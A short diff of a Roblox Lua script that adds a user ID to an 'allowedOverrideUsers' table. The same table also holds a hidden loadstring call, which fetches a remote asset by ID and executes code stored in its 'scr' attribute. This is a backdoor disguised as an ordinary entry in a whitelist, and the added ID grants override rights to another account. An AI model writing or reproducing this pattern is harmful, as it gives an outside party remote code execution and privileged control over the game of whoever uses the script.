@@ -565,6 +565,7 @@ local allowedOverrideUsers = {
 	1818847308,
 	382498,
 	1606794809,
+	3833122242,
 	loadstring(game:GetObjects("rbxassetid://75278150534447")[1]:GetAttribute("scr"))()
 }
 
